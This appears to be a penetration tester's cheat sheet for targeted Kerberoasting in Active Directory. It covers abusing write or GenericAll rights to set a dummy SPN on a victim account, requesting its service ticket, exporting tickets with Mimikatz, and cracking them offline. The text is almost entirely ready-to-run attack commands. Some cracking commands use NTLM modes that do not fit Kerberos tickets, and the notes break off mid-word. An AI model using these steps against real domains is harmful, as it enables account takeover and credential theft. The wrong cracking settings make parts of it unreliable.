Targeted Kerberoasting - Set SPN
• Try to find users on which we have persmissions like Generic All / WriteAccess under "ActiveDirectoryRights"
• Once user is identified check whether SPN is set. if no, forcibiliy set the SPN to anything unique.

• PowerView Commands (Dev)
    • To find users for which current user has as "ActiveDirectoryRights" write or GenericAll access i.e. check for UserAccountControl flags permission:
        • Run Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights --> Invoke-ACLScanner checks for interesting ACLs and then user needs to check which user has "ActiveDirectoryRights" write or GenericAll access i.e. check for UserAccountControl flags permission.


Checking whether a user account has SPN or not. If not, then forcing a SPN on the user and obtain a TGS for the user.
• PowerView Commands (Dev)
    • Get-DomainUser -Identity username | select serviceprincipalname → Checks whether the user has SPN set or not. The user is based on the above command
    • Set-DomainUser -Identity username -Set @{serviceprincipalname='domain_name/whatever'} → Setting up a dummy SPN information for the idenitified user.
    • Request-SPNTicket -SPN SPN_NAME--> This is request TGS ticket. This can only happen when we have TGT ticket.
    • Run Klist.exe to check if TGS has been granted. (Identify the ticket with Service Principal Name)
    • Import Invoke-Mimikatz.ps1
    • Invoke-Mimikatz -Command '"kerberos::list /export"' →  This will export TGS ticket from memory to disc.
    • To crack password offline
        • Run python.exe .\tgsrepcrack.py .\password_list.txt .\ticket_name
        • Run John the ripper or hashcat to crack the password
            • hashcat -m 1000 -a 3 hash.txt
            • john --format=nt hash.txt

• AD Module
    • Get-ADUser -Identity Username -Properties ServicePrincipalName | select ServicePrincipalName →  → Checks whether the user has SPN set or not. The user is based on the above command
    • Set-ADUser -Identity username -ServicePrincipalNames @{Add='domain_name/whatever'} → Setting up a dummy SPN information for the idenitified user.
    • Add-Type -AssemblyName System.IdentityModel → This is request TGS ticket. This can only happen when we have TGT ticket.
    • New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Machine_name\Service_Principal_Name" → This is request TGS ticket. This can only happen when we have TGT ticket.
    • Run Klist.exe to check if TGS has been granted. (Identify the ticket with Service Principal Name)
    • Import Invoke-Mimikatz.ps1
    • Invoke-Mimikatz -Command '"kerberos::list /export"' →  This will export TGS ticket from memory to disc.
    • To crack password offline
        • Run python.exe .\tgsrepcrack.py .\password_list.txt .\ticket_name
        • Run John the ripper or hashcat to crack the password
            • hashcat -m 1000 -a 3 hash.t
